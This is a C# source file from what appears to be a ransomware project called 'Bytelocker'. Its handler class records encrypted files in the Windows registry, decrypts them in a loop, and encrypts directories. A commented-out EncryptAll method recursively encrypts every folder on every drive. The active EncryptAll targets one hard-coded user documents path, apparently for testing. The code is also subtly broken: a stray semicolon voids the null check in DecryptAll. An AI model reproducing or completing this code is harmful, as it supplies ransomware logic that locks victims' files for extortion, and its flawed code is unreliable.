using Bytelocker.Settings;
using Bytelocker.UI;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading;

namespace Bytelocker.CryptoManager
{
    class CryptoManagerMainHandler
    {
        private RegistryManager rm;

        public CryptoManagerMainHandler()
        {
            this.rm = new RegistryManager();
            this.rm.CreateMainKey();
        }

        public void DecryptSingleFile(String file)
        {
            FileManager fm = new FileManager();
            fm.ChooseFile(file);
            fm.SetupFileEncrypter();
            fm.DecryptFile();
        }

        public void DecryptAll()
        {
            bool hasDecryptedSuccess;
            FileManager fm = new FileManager();
            List<String> files = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);

            if (!(files[0] == "null"));
            {
                foreach (String file_path in files)
                {
                    do
                    {
                        MainWindow.current_decrypt_file = file_path;
                        fm.ChooseFile(file_path);
                        fm.SetupFileEncrypter();

                        // stop progress bar update while decrypting
                        hasDecryptedSuccess = fm.DecryptFile();

                        if (hasDecryptedSuccess)
                        {
                            MainWindow.error_decrypt_file = false;
                            fm.DeleteFile();
                            fm.RenameTmpFileToOrig();
                        }
                        else
                        {
                            MainWindow.error_decrypt_file = true;
                            while (!(MainWindow.error_decrypt_file_continue))
                            {
                                Thread.Sleep(500);
                            }
                            MainWindow.error_decrypt_file_continue = false;
                        }
                    } while (MainWindow.error_decrypt_file);
                }
            }  
        }
        /*
        public void EncryptAll()
        {
            DirManager dfm = new DirManager();

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                List<String> dirs = DirManager.GetFoldersRecursive(drive.ToString());
                foreach (String subDir in dirs)
                {
                    dfm.ChooseDir(subDir);
                    dfm.EncryptDir();
                }
            }
        }
        */


        public void EncryptAll()
        {
            DirManager dfm = new DirManager();
            List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Documents\personal");
            foreach (String subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.EncryptDir();
            }
        }

        public List<String> FilesEncryptedList()
        {
            try
            {
                return new List<String>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
            } catch (Exception)
            {
                // if the key does not exist return empty list
                return new List<String>();
            }
            
        }
    }
}
